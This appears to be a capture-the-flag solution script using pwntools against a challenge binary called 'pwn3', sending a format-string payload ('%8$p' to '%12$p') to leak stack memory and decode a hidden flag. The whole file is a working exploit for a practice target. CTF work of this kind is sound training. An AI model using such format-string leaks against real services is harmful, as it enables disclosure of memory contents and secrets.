#!/usr/bin/env python3
from pwn import *

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1337) # change host and port
else:
    r = process('./pwn3')

r.recvuntil(b'?\n')
PAYLOAD = b''
for i in range(8, 13):
    PAYLOAD += f'%{i}$p'.encode()

r.sendline(PAYLOAD)
flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
pascal = ''
for i in flag:
    pascal += i.to_bytes(8, 'little').decode()

pascal = pascal.replace('\x00', '')
print(pascal)